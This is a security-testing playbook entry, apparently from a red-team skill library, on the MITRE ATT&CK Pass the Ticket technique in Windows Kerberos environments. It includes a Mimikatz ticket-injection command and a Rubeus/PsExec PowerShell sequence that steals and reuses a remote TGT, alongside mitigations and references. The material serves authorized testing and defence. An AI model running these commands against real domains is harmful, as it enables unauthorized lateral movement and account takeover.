---
name: "T1550.003_pass-the-ticket"
description: "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1550.003
  - defense-evasion
  - lateral-movement
  - windows
  - sub-technique
technique_id: "T1550.003"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - lateral-movement
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1550/003"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1550
  - T1550.001
  - T1550.002
  - T1550.004
prerequisites:
  - T1550
severity_boost:
  T1550: "Chain with T1550 for deeper attack path"
  T1550.001: "Chain with T1550.001 for deeper attack path"
  T1550.002: "Chain with T1550.002 for deeper attack path"
---

# T1550.003 Pass the Ticket

> **Sub-technique of:** T1550

## High-Level Description

Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.

A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).

A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Lateral Movement (TA0008)

**Platforms:** Windows

## What to Check

- [ ] Identify if Pass the Ticket technique is applicable to target environment
- [ ] Check Windows systems for indicators of Pass the Ticket
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Mimikatz Kerberos Ticket Attack

Similar to PTH, but attacking Kerberos

**Supported Platforms:** windows

```cmd
"#{mimikatz_exe}" "kerberos::ptt #{ticket}"
```

**Dependencies:**
- Mimikatz must exist on disk at specified location (#{mimikatz_exe})

### Atomic Test 2: Rubeus Kerberos Pass The Ticket

Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
& "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
& "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge
```

**Dependencies:**
- Rubeus must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"
- PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Pass the Ticket by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1550.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management
Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.

### M1027 Password Policies
Ensure that local administrator accounts have complex, unique passwords.

### M1018 User Account Management
Do not allow a user to be a local administrator for multiple systems.

### M1015 Active Directory Configuration
To contain the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days.


## Detection

### Detection Strategy for T1550.003 - Pass the Ticket (Windows)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Pass the Ticket technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [CERT-EU Golden Ticket Protection](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)
- [Campbell 2014](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)
- [GentilKiwi Pass the Ticket](https://web.archive.org/web/20210515214027/https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos)
- [ADSecurity AD Kerberos Attacks](https://adsecurity.org/?p=556)
- [Stealthbits Overpass-the-Hash](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)
- [Atomic Red Team - T1550.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1550.003)
- [MITRE ATT&CK - T1550.003](https://attack.mitre.org/techniques/T1550/003)
